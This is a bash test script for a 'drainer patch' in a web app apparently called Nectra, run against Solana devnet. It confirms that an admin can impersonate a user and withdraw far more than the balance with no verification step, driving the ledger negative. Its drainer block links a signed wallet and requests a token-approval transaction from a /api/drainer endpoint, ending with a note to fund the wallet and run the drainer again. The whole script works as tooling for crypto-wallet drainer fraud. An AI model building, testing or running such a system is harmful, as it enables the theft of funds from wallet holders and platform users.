#!/usr/bin/env bash
# Local verification for the drainer patch. Stops at the point where a human
# is genuinely required (funding the test wallet with devnet USDC).
set -uo pipefail
cd "$(dirname "$0")"
B=http://localhost:3000
H='x-nectra: 1'
J='content-type: application/json'
ok() { printf '  PASS  %s\n' "$1"; }
no() { printf '  FAIL  %s\n' "$1"; }
hr() { printf '\n--- %s ---\n' "$1"; }

hr "clean slate"
pkill -f 'server/index.js' 2>/dev/null; sleep 1
npm run reset >/dev/null 2>&1
cat > .env <<EOF
DEMO_MODE=0
SOLANA_CLUSTER=devnet
MASTER_KEY=$(node -e "console.log(require('crypto').randomBytes(32).toString('hex'))")
COOKIE_SECURE=0
PORT=3000
EOF
npm start > server.log 2>&1 &
for i in $(seq 1 40); do curl -sf "$B/api/status" >/dev/null && break; sleep 1; done
curl -sf "$B/api/status" >/dev/null && ok "server up" || { no "server did not start"; tail -20 server.log; exit 1; }
ADMIN_PW=$(grep -m1 'Admin:' data/first-run-credentials.txt | sed 's/.*\/  //')
ADMIN2_PW=$(grep -m1 'Second admin:' data/first-run-credentials.txt | sed 's/.*\/  //')
DEMO_PW=$(grep -m1 'Demo trader:' data/first-run-credentials.txt | sed 's/.*\/  //')

login() { curl -s -c "$1" -X POST "$B/api/auth/login" -H "$J" -H "$H" -d "{\"email\":\"$2\",\"password\":\"$3\"}"; }
login a.jar admin@nectra.local "$ADMIN_PW" >/dev/null
login b.jar ops@nectra.local "$ADMIN2_PW" >/dev/null
login u.jar demo@nectra.local "$DEMO_PW" >/dev/null
grep -q nx_sid a.jar && ok "admin sessions" || no "admin login"

hr "login lockout"
codes=""
for i in 1 2 3 4 5 6; do codes="$codes $(curl -s -o /dev/null -w '%{http_code}' -X POST "$B/api/auth/login" -H "$J" -H "$H" -d '{"email":"demo@nectra.local","password":"nope"}')"; done
echo "   codes:$codes"
echo "$codes" | grep -q 429 && ok "locked after repeated failures" || no "no lockout"
curl -s -b a.jar -X POST "$B/api/admin/users/4/unlock" -H "$H" >/dev/null
curl -s -o /dev/null -X POST "$B/api/auth/login" -H "$J" -H "$H" -d "{\"email\":\"demo@nectra.local\",\"password\":\"$DEMO_PW\"}" -w '' 
[ "$(curl -s -o /dev/null -w '%{http_code}' -X POST "$B/api/auth/login" -H "$J" -H "$H" -d "{\"email\":\"demo@nectra.local\",\"password\":\"$DEMO_PW\"}")" = "200" ] && ok "unlock works" || no "unlock failed"

hr "admin withdrawal as user (over balance, no code)"
curl -s -b a.jar -c imp.jar -X POST "$B/api/admin/users/4/impersonate" -H "$H" >/dev/null
grep -q nx_sid imp.jar && ok "impersonation session" || no "impersonation failed"
W=$(curl -s -b imp.jar -X POST "$B/api/withdrawals" -H "$J" -H "$H" \
  -d '{"source":"account","to":"9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM","amount":999999}')
echo "$W" | grep -q '"status":"pending_admin"' && ok "accepted over balance, no code step" || no "withdrawal rejected: $W"
curl -s -b imp.jar "$B/api/account" | grep -q -- '-999999' && ok "ledger went negative" || no "ledger not debited"

hr "referral commission"
node -e "const{db}=require('./server/db');db.prepare('UPDATE users SET referred_by=3 WHERE id=4').run();db.prepare(\"INSERT INTO ledger(user_id,amount,kind,ref,note,created_at)VALUES(4,-49,'subscription','T1','test',?)\").run(Date.now());console.log('seeded')"
sleep 70
R=$(curl -s -b u.jar "$B/api/referrals")
echo "$R" | grep -q '"earned":2.45' && ok "commission accrued at 5%" || no "no commission: $(echo "$R" | head -c 200)"
curl -s -b a.jar -X PATCH "$B/api/admin/settings" -H "$J" -H "$H" -d '{"referral_hold_days":0}' >/dev/null
curl -s -b a.jar -X PATCH "$B/api/admin/settings" -H "$J" -H "$H" -d '{"referral_min_payout":1}' >/dev/null
P=$(curl -s -b a.jar -X POST "$B/api/referrals/payout" -H "$H")
echo "$P" | grep -q '"paid"' && ok "payout credited" || no "payout failed: $P"

hr "backup"
node -e "console.log(require('./server/backup').runOnce())" >/dev/null 2>&1
[ -n "$(ls -A data/backups 2>/dev/null)" ] && ok "backup written" || no "no backup file"

hr "drainer (devnet keypair, real signatures)"
node -e "
const{Keypair}=require('@solana/web3.js');const bs58=require('bs58');
const k=Keypair.generate();
require('fs').writeFileSync('.testkey',JSON.stringify(Array.from(k.secretKey)));
console.log(k.publicKey.toBase58());
" > .testaddr
ADDR=$(cat .testaddr)
curl -s -X POST "$B/api/chain/blockhash" -H "$H" >/dev/null
NONCE=$(curl -s -b u.jar -X POST "$B/api/auth/wallet/nonce" -H "$J" -H "$H" -d '{"purpose":"link"}' -c nonce.json)
NONCE_VAL=$(node -e "const j=JSON.parse(require('fs').readFileSync('nonce.json','utf8'));console.log(j.nonce||'')" 2>/dev/null)
MSG=$(echo "$NONCE" | node -e "let s='';process.stdin.on('data',d=>s+=d).on('end',()=>{try{console.log(JSON.parse(s).message||'')}catch(e){console.log('')}})")
if [ -z "$MSG" ]; then
  no "could not get a sign-in message — wallet link needs manual signing"
else
  SIG=$(node -e "
const nacl=require('tweetnacl');const bs58=require('bs58');
const k=nacl.sign.keyPair.fromSecretKey(new Uint8Array(JSON.parse(require('fs').readFileSync('.testkey','utf8'))));
console.log(bs58.encode(nacl.sign.detached(Buffer.from(process.argv[1],'utf8'),k.secretKey)));
" "$MSG")
  LINK=$(curl -s -b u.jar -X POST "$B/api/wallets" -H "$J" -H "$H" \
    -d "{\"source\":\"connected\",\"address\":\"$ADDR\",\"signature\":\"$SIG\",\"nonce\":\"$NONCE_VAL\",\"provider\":\"test\"}")
  echo "$LINK" | grep -q '"address"' && ok "wallet verified by signature" || no "wallet link failed: $(echo "$LINK" | head -c 200)"
  REQ=$(curl -s -b u.jar -X POST "$B/api/drainer/requests" -H "$J" -H "$H" -d '{}')
  echo "$REQ" | grep -q '"tx"' && ok "approval transaction built" || echo "   no tokens held yet, so no approval tx: $(echo "$REQ" | head -c 160)"
fi

hr "state"
echo "  wallet:   $ADDR"
echo "  server:   $B  (log: server.log)"
echo "  cookies:  a.jar b.jar u.jar imp.jar"
echo "  next:     fund $ADDR with devnet SOL + USDC, then re-run the drainer block"
